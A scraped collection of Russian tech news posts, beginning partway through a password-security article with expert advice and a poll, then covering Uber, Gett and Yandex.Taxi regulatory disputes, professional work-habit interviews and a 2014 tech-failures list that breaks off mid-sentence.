почти противоречит безопасности…\n\r\nМой выбор – KeePass на доверенных компьютерах, база защищена длинной парольной фразой. И никаких хранилищ паролей в облаках или на мобильных устройствах.\n\r\nА вот, что по теме защите паролей думают зарубежные эксперты:\n\n Джеспер Йоханссон, главный инженер по ИБ в Amazon\n\r\nВ некоторых компаниях есть политика безопасности, запрещающая сотрудникам записывать пароли на бумажки. Я считаю, это абсолютно неправильно (это заявление Йоханссон сделал еще будучи сотрудником Microsoft). Все должно быть наоборот — в политике должно быть сказано, что вы должны записывать свой пароль. У меня 68 разных паролей для разных систем. Если мне нельзя будет ничего из этого записать, угадайте, что я сделаю? Я просто буду использовать везде один и тот же пароль.\n\r\nДо сих пор встречаются системы, которые не дают использовать «нормальные» пароли, поэтому я выберу самый простой и плохой из всех возможных вариантов. В то же время, если записать их на бумажку (и спрятать ее в надежное место), то тут проблем нет. Таким образом можно сохранить больше паролей и сделать их более сильными.\n\n Брюс Шнайер, эксперт и автор книг по информационной безопасности и криптографии\n\r\nОбычно пароль состоит из корня и суффикса. Корень может не обязательно быть словарным словом, но чаще всего, это что-то, что можно произнести, к чему добавляются разные суффиксы (в 90% случаев) или префиксы (в 10% случаев). Программы для подбора паролей используют словари (английский и другие языки), заменяют буквы похожими на них символами ($ вместо s и т.п.). Для подбора паролей может также использоваться информация из адресной книги, важные даты и другие персональные данные.\n\r\nЧтобы создать сильный пароль, нужно сделать что-то, что затруднит этот процесс подбора. Я предлагаю использовать предложения, которые превращаются в пароль. Например, «This little piggy went to market» («маленькая хрюшка пошла на рынок») можно сделать что-то типа «tlpWENT2m». Пароль из девяти символов, которого не будет ни в каком словаре. После того, как я его опубликовал, конечно, конкретно этот использовать не надо, но суть ясна.\n\r\nЕсли вы не можете запомнить все свои пароли, то запишите их на бумажке и носите в кошельке. Но писать надо не сам пароль, а исходное предложение, а лучше — какую-то подсказку, которая поможет его вспомнить. Или можно использовать Password Keeper, в этом ничего такого нет, многие не могут запомнить все свои пароли.\n\n Брайан Кребс, ИБ-исследователь, автор блога Krebs on Security\n\r\nЕсть несколько советов по созданию сильных паролей, лучше проверить свои пароли на соответствие им. Пароль должен состоять из комбинации слов, чисел, символов и букв в верхнем и нижнем регистре.\n\r\nВ качестве пароля нельзя использовать свое же имя пользователя или легко угадываемые слова («password»), словарные слова и очевидные комбинации символов («azdzxs»). Также не стоит выбирать пароль на основе данных, которые могут быть не такими уж и конфиденциальными (номер телефона, дата рождения, имена членов семьи).\n\r\nНельзя использовать пароль для электронной почты (если там есть что-то важное) на любом другом сайте. Если кто-то взломает интернет-магазин, где вы делали покупки, то сможет прочесть и ваши письма.\n\r\nРаньше я считал, что хранить пароли в записанном где-то виде не стоит. Однако теперь я все же согласем с Брюсом Шнайером в том, что можно хранить пароли в записанном виде, главное, чтобы это был не сам пароль, а нечто, что поможет его вспомнить.\n\r\nПри использовании Firefox важно включить и настроить мастер-пароль для всех паролей, иначе любой, у кого есть физический доступ к компьютеру, сможет увидеть пароли в plain text, сделав пару кликов. Также есть несколько хороших облачных менеджеров паролей (LastPass, DashLane, 1Password), но если вы не хотите доверять такие данные облаку, то можно воспользоваться локальным менеджером (Roboform, PasswordSafe, Keepass). Главное выбрать сильный мастер пароль, который к тому же потом можно будет вспомнить (если вы его забудете, то тогда начнутся проблемы).     Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста. Как вы обеспечиваете безопасность своих учетных записей? \n            16.42%\n           Использую парольные фразы \n            66\n           \n            45.52%\n           Храню пароли в специальных программах \n            183\n           \n            1.99%\n           Часто меняю пароли на важных учетных записях \n            8\n           \n            8.46%\n           Не доверяю облакам \n            34\n           \n            14.43%\n           Где только можно, использую двухфакторную аутентификацию \n            58\n           \n            9.7%\n           Все вышеперечисленное \n            39\n           \n            3.48%\n           Другое (напишу в комментариях) \n            14\n            \n       Проголосовали 402 пользователя.  \n\n       Воздержались 124 пользователя.", {"day": "30", "month": "июля", "time": "12:44"}, {"rate": 10, "views": 34000}], ["По мнению представителей Федерации автовладельцев России, службы заказа такcи, такие, как Uber, Gett и «Яндекс.Такси», нарушают закон, практикуя доплаты водителям. В ФАР считают, что такие действия служб заказа такси — это «открытое пренебрежение к организационным и техническим основам, а также традициям безопасности легковых перевозок пассажиров», пишет Slon. Для того, чтобы проверить правомерность действия этих сервисов, ФАР во главе с Сергеем Канаевым обратилась в Генпрокуратуру, Федеральную антимонопольную службу и Общественную палату с просьбой проверить работу сервисов вызовов такси.\n\r\nВ самом письме говорится, что подобная практика является «общественно опасным деянием», которая «имеет все признаки состава преступления, квалифицируемого частью 2 статьи 204 УК РФ “Коммерческий подкуп”».\n\r\nПредставители Uber и «Яндекс.Такси» уже прокомментировали обращение ФАР, заявив, что низкие тарифы сервисов, по сравнению с тарифами традиционных такси-компаний, обусловлены более эффективной модели ведения бизнеса. При этом руководство Uber заявило, что обвинения со стороны ФАР не соответствуют действительности. \n\r\nНапомним также, что в начале июля таксомоторные компании Санкт-Петербурга попросили губернатора Георгия Полтавченко запредить Uber, Gett и «Яндекс.Такси». Губернатор отказался, сославшись на отсутствие подобных полномочий у региональных властей.", {"day": "24", "month": "июля", "time": "14:15"}, {"rate": 12, "views": 7100}], ["Калифорнийские регуляторы предъявили компании Raiser-CA, дочерней организации Uber, штраф в 7,3 миллиона долларов за непредоставление отчётности о доступности транспортных средств для инвалидов, безопасности и служебной информации в 2014 году. У компании есть возможность в течение тридцати дней подать аппеляцию или оплатить штраф. Uber обжалует решение. \n\n\n\r\nRaiser-CA предоставляет услуги UberX в Калифорнии. Комиссия по регулированию общественных услуг (California Public Utilities Commission) не получила от компании отчёты о количестве заказов такси, сделанных людьми с ограниченными возможностями, и о наличии автомобилей, способных выполнить такие заказы. Вторым нарушением компании стало непредоставление информации о количестве заказанных поездок, количестве отказов и сумме денег, выплаченных клиентами. Третье нарушение — отсутствие информации о дорожно-транспортных происшествий с участием водителей UberX. \n\r\nКомпании дали тридцать дней на оплату или обжалование штрафа в 7,3 миллиона долларов. В ином случае деятельность компании на территории Калифорнии будет приостановлена. \n\r\nПредставитель Uber заявил, что штраф «глубоко разочаровывает». Компания обжалует решение, потому что Uber уже предоставил значительные объемы данных в Комиссию по регулированию общественных услуг — это информация, которую компания предоставляет в других штатах. По мнению Uber, запросы «выходят за рамки Комиссии и не улучшат общественную безопасность».\n\r\nВ последние месяцы у Uber были проблемы с обслуживанием некоторых клиентов: на компанию в сентябре 2014 года подали в суд Сан-Франциско, утверждая, что водители UberX нарушают права инвалидов, отказываясь возить слепых людей с животными. \n\n\n\r\nUber по разным причинам преследуют по всему миру, часто из-за вмешательства инициативных сотрудников официальных такси. В мае UberX запретили в Южной Корее: новый закон запрещает оказывать транспортные услуги без лицензии. В том же месяце миланский суд вынес решение о запрете деятельности UberX на территории Италии. Услуги UberPOP во Франции были прекращены после того, как водители официальных такси начали переворачивать и сжигать машины Uber. \n\r\nКомиссия по защите конкуренции Болгарии в июле 2015 года оштрафовала две партнерских компании Uber на 100 тысяч евро: услуги Uber аналогичны услугам официальных такси, но компании не платят налогов, не получают лицензии и не отчитываются регуляторам о доходах, что даёт им конкурентные преимущества. \n\r\nФедеральная антимонопольная служба России не считает, что сервисы Uber, Gett и «Яндекс.Такси» нарушают законодательство. Замглавы ведомства Андрея Цариковского заявил что сочувствует водителям такси, но интернет-сервисы, подобные Uber, очень удобные.", {"day": "16", "month": "июля", "time": "12:40"}, {"rate": 10, "views": 5100}], ["После новостей о том, что представители таксомоторных компаний Санкт-Петербурга 2 июля обратились к губернатору Георгию Полтавченко с просьбой запретить работу компаний Uber, Gett и «Яндекс.Такси», в ситуацию вмешалась Федеральная Антимонопольная Служба.\n\r\nСлова замглавы ведомства Андрея Цариковского приводит «Агентство бизнес-новостей»:«Я здесь не вижу нарушений антимонопольного законодательства. Мне конфликт кажется несколько надуманным»Также Цариковский заявил, что сочувствует водителям такси, однако, по его мнению, интернет-сервисы, подобные Uber, очень удобные.\n\r\nПо мнению таксистов, обратившихся с жалобой, упомянутые компании не несут ответственности за свою работу и прибыль от их деятельности получают иностранные компании, не платящие налоги в России. Авторы обращения также считают, что интернет-сервисы занижают стоимость поездок, нарушая, таким образом, закон о конкуренции.", {"day": "4", "month": "июля", "time": "22:01"}, {"rate": 13, "views": 5000}], ["Американская компания Uber в пятницу была вынуждена объявить о приостановке работы мобильного приложения для поиска, вызова и оплаты дешевых такси или частных водителей UberPOP во Франции на фоне противостояния с традиционными таксистами. Новость о забастовке Французских таксистов, требующая запрета деятельности Ubera на территории страны и для большей наглядности подкрепляющих свои пожелания избиениями водителей и сожжением их автомобилей, не обошла стороной и площадки Хабра. Причём автором статьи была высказана смелая мысль, что российским интернет сервисам, среди которых можно выделить в первую очередь такие, как «Яндекс Такси», «РБТакси» и «Intertos такси», ничего подобного не угрожает. Ведь они принимают в свои ряды исключительно водителей, имеющих лицензии.\r\n Однако, успехи в борьбе наших «европейских партнёров» против Uber вдохновили владельцев традиционных российских служб такси. Результат — в Столице Революций, Санкт-Петербурге, зарождается очередная запретительная инициатива для нашей Госдумы. Давайте попробуем разобраться в чём она заключается, на чём основывается и насколько серьёзную угрозу представляет для быстро набирающего популярность удобного и дешёвого интернет-сервиса.\n\nИнформация для справки:\r\nПо данным городского комитета по транспорту Санкт-Перетбурга, на 1 июня 2015 г. разрешения на перевозку пассажиров такси имеет более 5500 ИП и 400 юрлиц, в общей сумме это пордка 33 000 автомобилей. На сегодняшний день около 20–30% заказов идут через сервисы IT-компаний и этот процент неуклонно растёт.\n\nТы виноват уже тем, что хочется мне кушать\n\r\nНекоммерческое партнерство «Петербургское такси» опубликовало на своем сайте открытое письмо к губернатору Санкт-Петербурга Георгию Полтавченко. Оно подписано директором партнерства Александром Холодовым. В объединение входят крупнейшие перевозчики города – «Такси 6000000», «Такси 068», «Такси 063», «7000000» и др.\r\nТаксисты жалуются, что тарифы тройки – Uber, GetTaxi (сейчас называется Gett) и «Яндекс.Такси» – сопоставимы с ценой поездки на общественном транспорте (49–50 руб.), это нарушает закон о конкуренции, считают они. Поводом обвинить сервисы в нарушении антимонопольного законодательства стало то, что для удобства пассажиров они субсидируют на небольшие суммы «сверхкороткие» поездки. Очень удобно проехаться утром в ненастную погоду пару автобусных остановок до метро всего за 50 рублей. Не знаю, как в Питере, а в Москве до появления этих служб ценник начинался с трёхсот рублей. При этом Яндекс не работает себе в убыток, он просто увеличивает процент отчислений в свою пользу за счёт поездок на большие расстояния. Интересно, что подобная систем перекрёстного субсидирования широко распространена в России. Лучший пример — субсидирование цены «социально значимых товаров» в торговых сетях. Тем не менее, на них почему-то не подают заявления в прокуратуру и не обвиняют в нарушении антимонопольного законодательства. \r\nUber, Gett и «Яндекс.Такси» налоги платят только с полученных процентов, а не с суммы заказа, утверждает «Петербургское такси». Самое же страшное обвинение — доход получают иностранные компании, не платящие налогов в России вообще, и в Санкт-Петербурге в частности. \n\nНемолчание ягнят\n\r\nСами сервисы отвергают обвинения таксистов. «Яндекс.Такси» сообщает, что в Петербурге не берет комиссию с таксопарков и компенсирует водителям часть стоимости лишь самых коротких поездок. Такая система позволяет водителям зарабатывать и очень удобна для пассажиров, отмечает представитель компании. Михаил Фишер. Глава Uber в Санкт-Петербурге, утверждает, что компания работает только с юрлицами и индивидуальными предпринимателями (ИП). По его словам, во Франции и других странах претензии властей вызывал сервис UberPOP где водителями могут выступать частные лица без лицензии. В России этот сервис не работает.\r\n«Геттакси рус» – самостоятельное юрлицо, не филиал и не представительство иностранной компании и платит налоги в России, говорит гендиректор Gett в России Виталий Крылов. По его словам, компания работает только с лицензированными перевозчиками.\n\nА судьи кто?\r\nВопросы таксистов к губернатору надо переадресовать федеральным чиновникам, утверждает представитель Полтавченко Андрей Кибитов. По его словам, у губернатора нет полномочий по регулированию интернета и интернет-коммерции. Нет таких полномочий и у комитета по транспорту, говорит представитель комитета.\r\nРегулирование интернет-сервисов по частному извозу – это вопрос правового характера, соответственно, обращаться необходимо к законодательной ветви власти.\r\nПретензии некоммерческого партнерства к деятельности Uber, Gett и «Яндекс.Такси» сводятся к нарушению налогового и антимонопольного законодательства, их должны проверять полиция и антимонопольная служба, а не губернатор, утверждают юристы.\n\nЗакатают ли Яндекс в асфальт?\n\r\n Однако совсем не исключено, что чиновники могут принять «некое политическое решение под влиянием лобби или локальных протестов классических служб такси, не желающих снижать свои прибыли в конкуренции с сервисами нового поколения по заказу такси. Крестовый поход традиционных служб такси напоминает бессмысленную борьбу луддитов. Невозможно остановить прогресс, борьба против новых технологий, позволяющих экономить ресурсы и делать нашу жизнь комфортней обречена на поражение.\r\n Когда я наблюдаю за попытками цепляться за ускользающее прошлое, то перед глазами встают картины из возможного недалёкого будущего — массовые протесты владельцев офисных зданий против распространения удалённой работы и их требования законодательно запретить работу дома и в кафе, мотивированные ссылками на невозможность контроля за условиями труда. Думаете фантастика?\n\r\nP.S. Сегодня поступили комментарии от ФАС.\nФедеральная антимонопольная служба (ФАС) не усматривает нарушений законодательства в деятельности интернет-приложений по вызову такси Uber, GetTaxi и «Яндекс.Такси», сказал замруководителя ведомства Андрей Цариковский. «Я не вижу нарушения антимонопольного законодательства. С пользой спорить нельзя.\r\n Разум возобладал? Что то мне подсказывает, что это только первый раунд.     Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста. Чем по вашему мнению закончится борьба с интернет сервисами такси в России? \n            47.03%\n           Прогресс не остановить. Традиционные таксисты и бомбилы скоро вымрут как класс. \n            514\n           \n            27.17%\n           См выше, но только для крупных городов. В глубинке слишком мало проникновение интернета. \n            297\n           \n            15.1%\n           Интернет сервисы «придавят» дополнительными сборами и налогами, что сделает их услуги дороже традиционных такси. Таким образом будет нащупан новый баланс. \n            165\n           \n            10.7%\n           Советские люди в булочную на такси не ездят! \n            117\n            \n       Проголосовали 1093 пользователя.  \n\n       Воздержался 121 пользователь.", {"day": "3", "month": "июля", "time": "22:54"}, {"rate": 18, "views": 18000}], ["«Как работают профессионалы» вновь на «Мегамозге», в этот раз – с не самым простым собеседником.\n\r\nМаша Дрокова известна многим, кто ходит на конференции и следит за информационными потоками. Возможно, по этой причине, а может быть, просто из-за девичьей скромности, Маша попросила просто назвать себя управляющим директором и основателем пиар-студии в её лице.\n\r\nОт себя нельзя не добавить, что Мария была названа в числе топ-50 технологических пиарщиков по версии Business Insider.\n\n\n\nТекущее местоположение:\r\nНью-Йорк, Сохо. Офис.\n\nТекущее место работы:\r\nМоя пиар-студия.\n\nОдно слово, которое лучшее всего описывает, как вы работаете:\r\nРезультативно.\n\nСколько часов в сутки вы работаете?\r\n18-20.\n\nТекущий мобильный девайс:\r\niPhone 6\n\nТекущий компьютер:\r\nMacbook Air\n\nБез каких приложений, программ, утилит вы не можете жить?\r\nFacebook, HotelTonight, Gett, Google Docs, Twitter, Instagram, Skype, Календарь. \n\nКакой лайфхак помогает вам экономить время?\r\nMultitasking и безупречное планирование.\n\nКаким to-do менеджером вы пользуетесь?\nPyrus. Но это не просто to-do, а софт для командной работы.\n\nЧто вы слушаете, когда работаете?\r\nКоллег по Skype на другом конце планеты.\n\nЧто вы читаете сейчас?\r\nTechcrunch. А вообще – новую книгу об Элоне Маске: «Tesla, SpaceX, and the Quest for a Fantastic Future».\n\nКакая книга из последних прочитанных запомнилась больше всего?\r\nPeter Thiel: «Zero to one».\n\nВы используете электронные читалки или предпочитаете бумажные книги?\nBookmate.\n\nСколько времени вы спите?\r\n4-5 часов в сутки, 6 по выходным.\n\nВы сова или жаворонок?\r\nНи то, ни другое.\n\nКак вы завтракаете?\r\nВсегда одно и то же: «Green macha latte» и «Five grains oatmeal» из «Pret A Manger».\n\nКак вы проводите время в пути на работу/с работы?\r\nОтвечая на письма и планируя. Иногда пишу/редактирую пресс-релизы и питчи.\n\nКакой совет, который вам когда-либо давали, вы можете передать другим?\r\nПапа говорит: «Смена занятий — лучший отдых». Так и есть.", {"day": "2", "month": "июня", "time": "15:13"}, {"rate": 3, "views": 16000}], ["Уже завтра (21 мая) в Москве пройдет четвертая международная мобильная конференция MBLT15!\n\n\n\r\nПрограмма конференции делится на 6 секций: Мобильный мир в цифрах, СМИ в мобайле, Путешествия, Краудфандинг, Аналитика мобильных приложений и Интернет Вещей. \n\r\nКаждый год мы стараемся удивить гостей уникальным контентом и яркими личностями со всего мира. В этом году разбирать по кусочкам мобильный рынок будут докладчики из App Annie, Gett, Parallels, Kaspersky Lab, Meduza.io, Sports.ru, Metro UK, MediaMetrics, Sanoma Independent Media, Aviasales.ru, Uber, BlaBlaCar, HotelTonight, Webcrowd, Tinkoff, Delivery Club, Omate и Samsung.\n\r\nОзнакомиться с программой и успеть купить билет можно на официальном сайте.", {"day": "20", "month": "мая", "time": "11:11"}, {"rate": 11, "views": 2100}], ["«Как работают профессионалы» вновь на «Мегамозге», разбирая по полочкам рабочий ритм и привычки профессионалов на российском IT-рынке.\n\r\nНаш сегодняшний гость — Алексей Штарев, исполнительный директор компании SeoPult, наверняка, известной читателям «Мегамозга». Передаем ему слово.\n\nТекущее местоположение:\r\nОфис SeoPult\n\nТекущее место работы:\r\nSeoPult.ru\n\nОдно слово, которое лучшее всего описывает, как вы работаете:\r\nПродуктивно\n\nСколько часов в сутки вы работаете?\r\n12\n\nТекущий мобильный девайс:\r\niPhone 6\n\nТекущий компьютер:\r\nMacbook Pro\n\nБез каких приложений, программ, утилит вы не можете жить?\r\nДля компьютера: офисные приложения, Chrome, Google календарь, Skype, Outlook\r\nДля телефона: Gmail, календарь, банковские приложения, помощники в жизни (карты, турбоскан, парковки Москвы, Gett и пр.)\n\nКакой лайфхак помогает вам экономить время?\r\nСобственно разработанное планирование рабочего времени. Продуктивное использование календаря, офисной CRM, почты и чатов.\n\nКаким to-do менеджером вы пользуетесь?\r\nGoogle календарь + собственнописная CRM для рабочих задач.\n\nЧто вы слушаете, когда работаете?\r\nМузыка меня отвлекает.\n\nЧто вы читаете сейчас?\r\nОколо 50 подписок на околорабочую прессу + обязательно упоминания о компании в интернете.\n\nКакая книга из последних прочитанных запомнилась больше всего?\r\nНе читаю книг к сожалению, нет времени.\n\nВы используете электронные читалки или предпочитаете бумажные книги?\r\nТелефон для чтения электронной прессы за рулем.\n\nСколько времени вы спите?\r\n6-7 часов в будни, 8-9 часов в выходные.\n\nВы сова или жаворонок?\r\nЖаворонок, но в выходные иногда хочется поспать до 11.\n\nКак вы завтракаете?\r\nТолько кофе, завтрак игнорирую.\n\nКак вы проводите время в пути на работу/с работы?\r\nЗа рулем. Оперативное разгребание почты + чтение деловой прессы в пробках + продумывание рабочего дня. \r\nЕсли на мотоцикле — просто отдыхаю за рулем, сконцентрировавшись на дороге.\n\nКакой совет, который вам когда-либо давали, вы можете передать другим?\r\nРаботать не покладая рук круглосуточно. Только так что-то может получиться.", {"day": "18", "month": "мая", "time": "13:30"}, {"rate": 7, "views": 6000}], ["В первом квартале 2015 года у «Яндекс.Такси» утроилась выручка по сравнению с аналогичным периодом прошлого года. Об этом стало известно на конференции, посвященной итогам I квартала.\n\r\n«Сервис «Яндекс.Такси» в 1-м квартале показывал хорошие результаты. Мы улучшили качество, вышли в новые регионы, сохранив самое быстрое для таких сервисов время подачи», сообщил гендиректор «Яндекса» в России Александр Шульгин. \n\r\nСогласно финансовому отчету компании, «Яндекс.Такси» входит в сегмент «других доходов». Пока его величина по сравнению с общим доходом очень мала. Они принесли всего 2,2% общей выручки.\n\r\nВ первом квартале «другие доходы» увеличились на 163% и составили 276 млн рублей. А итоговая выручка компании увеличилась на 13%. «Мегамозг» сегодня уже писал об этом.\n\r\nСервис «Яндекс.Такси» зарабатывает на комиссии с таксопарков. Источники РБК сообщают, что в декабре прошлого года она составляла 9% выручки.\n\r\nГлавными конкурентами сервиса являются израильский GetTaxi и американский Uber. Они также получают прибыль за счет комиссии. В России компания Uber установила комиссию в 20%. Комиссия GetTaxi в декабре 2014 года составляла 15% без НДС. \n\r\nСтоит отметить, что GetTaxi планирует значительно увеличить прибыль за счет расширения бизнеса. Компания произвела ребрендинг, и в ближайшее время GetTaxi превратится в Gett – сервис, способный удовлетворить все повседневные потребности клиентов.", {"day": "28", "month": "апреля", "time": "20:32"}, {"rate": 5, "views": 3300}], ["Глава GetTaxi Шахар Вайсер на собственной странице в Facebook заявил, что с июля 2015 года компания диверсифицирует собственные услуги и через единое приложение будет предоставлять не только сервис заказа такси, но и еды, а так же маникюра или массажа, равно как и вызов на дом любой службы, от клининговой (уборка) до сантехнической.\n\nhttps://www.facebook.com/Sha.Waiser/posts/10153328786063701\n\r\nВ интервью «РБК» Вайсер пояснил, что четыре года компания планировала разработать сервис, способный удовлетворить все повседневные потребности собственных клиентов.\n\r\nВсе новые сервисы компании будут объединены в приложении под общим брендом Gett, ребрендинг которого компания уже произвела и пользователям в Москве оно доступно под новым названием. Основных направлений заказа будет пять:\n\nПитание\nУслуги в сфере красоты\nУслуги для дома\nУслуги для здоровья\nПассажирские перевозки\n\r\nКаким образом Gett будет определять и формировать тарифы на услуги, пока неизвестно. Новые услуги в обновленном приложении будут доступны для всех пользователей GetTaxi – сегодня это более 10 млн человек в 32 городах мира. Из них 2 млн – в Москве и Санкт-Петербурге, в которых работает компания.\n\r\nВайсер подчеркивает, что как и со службой такси, для новых услуг будет работать единый колл-центр, куда клиенты смогут обратиться со всеми вопросами. РБК также приводит цитату Шахара Вайсера: «Это не разовая акция из разряда «сегодня мы в течение одного дня привозим вам цветы» — вы всегда сможете купить у нас букет цветов».", {"day": "28", "month": "апреля", "time": "17:15"}, {"rate": 6, "views": 2000}], ["Настал декабрь — время подводить итоги уходящего года. Мы, вслед за порталом Cnet (в основе статьи — материал The biggest tech turkeys of 2014), начнем с… неудач, провалов, фейлов, поражений и прочих падений ниже технологического плинтуса. В общем и целом, 2014 год не оказался исключением — даже умудренные опытом компании иногда совершали не совсем умные поступки…\n\n14. Google: эй там, на барже!\n\n\r\nПомните гугловские баржи — таинственные плавсредства с кучей морских контейнеров на борту? Первую из них обнаружили у берегов Острова сокровищ, что в заливе Сан-Франциско. Вторая обозначила себя в порту Портленда, штат Мэн. Техномир погрузился в глубины теории заговора, обсуждая назначение этих самых барж. Что это? Футуристические дата-центры? Плавающие магазины?\n\r\nGoogle таки раскрыла тайну, сообщив, что на баржах собирались демонстрировать новые технологии. Но уже в конце февраля плавучую платформу безо всяких фанфар отогнали к Стоктону, находящемуся в 80 милях к востоку от Сан-Франциско. Портлендская конструкция была разобрана, а контейнеры отправились в утиль. Официальная причина: береговая охрана увидела в баржах потенциальный источник пожара и других опасных угроз.\n\r\nПолнейшее разочарование: бесславный конец тайны, привлекшей массу внимания, и десятки миллионов, выброшенные на ветер (по некоторым данным проект влетел Google в копеечку).\n\n13. Смарт-часы уже здесь! (Слышите, как они тикают?)\n\n\r\nБудем честны перед друг другом: какие из умных часов заслужили хотя бы часть той шумихи, которую подняли вокруг них в этом году? После нескольких интригующих попыток в 2013-ом, они просто обязаны были выстрелить. Что говорить, если та же Google серьезно отнеслась к новому тренду и подготовила Android Wear. \n\r\nSamsung, Motorola, LG и Sony — это если не перечислять еще десяток мелких компаний и стартапов — похоже только и занимались тем, что представляли все новые и новые, напичканные электроникой наручные часы.\n\r\nНо никуда не делись застаревшие проблемы: нескромые размеры, слабые аккумуляторы и глючный софт. По большому счету, в новинках было слишком мало того, что оправдало бы их покупку.\n\r\nНадеемся, что в 2015-ом кто-то из техногигантов сделает правильные выводы. Ну и ждем Apple Watch. \n\n12. Как вы систему мобильных платежей назовете, так она и...\n\n\r\nСправедливости ради, система мобильных платежей Isis Mobile Wallet была запущена в ноябре 2013 года. Но ее слабые позиции на рынке лишь подчеркивает тот факт, что теперь в англоязычных заголовках присутствует другой ISIS — Islamic State of Iraq and Syria. Чтобы избежать путаницы, поясним, что за рубежом для обозначения исламистской террористической организации используют несколько аббревиатур — ISIL, ISIS и IS (в русском языке в основном используется ИГИЛ — Исламское государство Ирака и Леванта). \n\r\nДабы не вызывать ненужных ассоциаций создатели Isis в июле заявили о ребрендинге, а начиная с сентября мобильные платежи получили название Softcard.\n\r\nПомимо брендинга у Isis/Softcard есть и другая проблема — октябрьский запуск Apple Pay. Это, к слову, может быть даже большей угрозой для бизнеса, чем террористы.\n\n11. Microsoft Kinect: выстрел в спину?\n\n\r\nВ этом году Microsoft начала очередную кампанию в поддержку продаж Xbox One. Одна из ключевых фишек консоли, игровой контроллер Kinect, был сброшен за борт, чтобы снизить цену до $400 (речь, естественно, идет о ценах «там»). Сегодня на ценниках в крупнейших розничных сетях США можно увидеть еще более приятные цифры, например, «$350» — и это с учетом того, что многие продавцы предлагают в комплекте с консолью бесплатные игры.\n\r\nОказалось, что от того, что ранее предподносилось, как «исключительная особенность», вполне можно отказаться. Теперь понятно, почему спрос на новый Kinect, предлагаемый в качестве опции, оказался, мягко говоря, слабеньким.\n\r\nЕсть подозрение, что инвестиции Microsoft в дальнейшее развитие контроллера будут сильно сокращены (или прекращены?) — ведь покупатель, который всегда прав, уже сделал свой выбор, проголосовав долларом.\n\n10. Aereo покидает нас\n\n\r\nКомпания использовала сеть миниантенн для перехвата телесигналов, транслируемых по воздуху (без уплаты телекомпаниям соответствующих взносов), и за небольшую плату предлагала всем желающим «стримить» контент на интернет-устройства. Увы, но вскоре ей пришлось столкнуться с непреодолимым препятствием в виде Верховного суда, который оценил деятельность компании, как нелегальную. Телекомпании победили, постановление суда было первым звоночком…\n\r\nЕще один удар Aereo получила в октябре, когда окружной суд США удовлетворил требование телекомпаний и осуществил предварительный судебный запрет на деятельность сервиса. Ну и в середине ноября, после многочисленных заявлений компании в духе «мы еще живы», Aereo все же пришлось подать заявление о банкротстве. RIP. Что в переводе с латыни — «Да упокоится с миром».\n\n9. Нечестная игра хайтек-таксистов\n\n\r\nЕсть конкуренция, а есть грязные приемчики. Lyft в августе заявила, что сотрудники конкурирующего сервиса Uber за предыдущие 9 месяцев заказали, а затем отменили более 1000 поездок — подобное поведение Lyft расценила как часть заговора по увольнению водителей. Uber отреагировала на обвинение, назвав его «очевидной ложью».\n\r\nНо была и еще одна проблема: практически в том же самом Uber обвинили создатели мобильного приложения по вызову такси Gett, которые заявили, что Uber использовала приемы, схожие с DoS-атаками, для переманивания водителей. На этот раз в Uber согласились, что их тактика «может кому-то показаться слишком агрессивной».\n\r\nНе прибавило Uber очков и заявление одного из ее топ-менеджеров, в котором говорилось о том, что компания может потратить около $1 млн на дискредитацию журналистов, которые стряпают статьи, очерняющие Uber. Генеральный директор компании Трэвис Каланик, правда, вскоре заметил, что заявление исполнительного вице-президента Эмиля Майкла «продемонстрировало недостаток лидерских качеств и гуманности, а также отход от ценности и идеалов компании». Тем не менее Майкл продолжает работать на Uber, так как Каланик считает, что «люди, которые делают ошибки, могут учиться на них».\n\r\nВажно! Не говорите о планах по дискредитации журналистов на завтраках, куда приглашены журналисты.\n\n8. Tizen: где же ты, где?\n\n\r\nКак утверждалось, в результате выхода операционной системы Tizen, разработанной Samsung и Intel, операторы получат смартфоны, которые они смогут самостоятельно кастомизировать и даже называть, как им заблагорассудится. Предполагалось, что это будет эдакая «хай-эндовская» ОС. А еще говорилось, что дебют новой мобильной операционки состоится в начале этого года.\n\r\nНичего этого не произошло.\n\r\nЕдинственными устройствами, где ощущался высокотехнологичный аромат Tizen, оказались смарт-часы Samsung, которые трудно назвать бестселлерами. В марте Tizen Association попыталась «изменить парадигму», заявив на Mobile World Congress, что ее софт сможет использоваться также и в умных телевизорах.\n\r\nДолгожданная ОС все-таки сможет удивить нас в ближайшие недели — на этот раз, как утверждается, в качестве платформы для смартфонов сегмента low-end.\n\n7. Facebook переходит на Темную сторону Силы\n\n\r\nFacebook оказалась в неловкой ситуации, опубликовав результаты исследования, в котором говорилось о манипуляции эмоциями определенной группы пользователей соцсети посредством внесения изменений в их ленты. Исследование затронуло 689 003 пользователя и около 3 млн постов.\n\r\nЗаявления добавило огня в давние споры по поводу приватности и, в частности, того, как Facebook использует информацию о своих пользователях.\n\r\nВсе закончилось (закончилось ли?) извинениями главного операционного директора Facebook Шерил Сандберг (на фото вверху), в которых, честно говоря, и извинений-то особенно не было: «Мы, очевидно, плохо коммуницировали и сожалеем об этом» — заявила она в эфире индийского телекомпании NDTV во время деловой поездки в Нью-Дели.\n\n6. GamerGate? Фу-фу-фу!\n\n\r\nСпоры о том, что все же из себя представлет GamerGate, не утихают до сих пор. Есть масса объяснений этому феномену: от попытки разоблачить предвзятость среди игрожуров до способа ответить критикам, несогласным с изображением женщин в видеоиграх. Что не ставится под сомнение, так это сексуальный подтекст, который стал отличительным признаком движения.\n\r\nАвтору блога Feminist Frequency Аните Саркисян (на фото вверху) пришлось прервать выступление в Университете штата Юта, после того как она получила анонимное письмо с угрозой «устроить самую масштабную резню в истории Америки», если она не прекратит свою презентацию. Независимая разработчица видеоигр Брианна Ву покинула собственный дом после того, как она начала получать угрозы, а ее домашний адрес был размещен в Сети. Зои Куинн, еще одной жертве GamerGate, также пришлось сменить место жительства.\n\r\nОбратила свое внимание на происходящее и игровая индустрия. Марк Морхейм, глава подразделения Blizzard Entertainment компании Activision, признал, что «харассмент запятнал нашу геймерскую репутацию». Чуть позже о своей позиции заявила Adobe: «Мы не поддерживаем GamerGate».\n\n5. Куда делись мои данные?\n\n\r\nВ этом году мы наконец-то уяснили, что нам все же стоит переживать за персональные данные. Количество доказательств — хоть отбавляй.\n\r\nВ октябре представители JPMorgan Chase сознались в том, что от утечки данных пострадало около 76 млн домохозяйств и 7 млн представителей малого бизнеса — гораздо больше первоначальных оценок.\n\r\nАмериканская розничная сеть Home Depot заявила о краже хакерами 53 млн электронных адресов. И это в дополнение к 56 млн номеров банковских карт. \n\r\nНу а если вам посчастливилось воспользоваться сторонними сервисами хранения фото и видео, 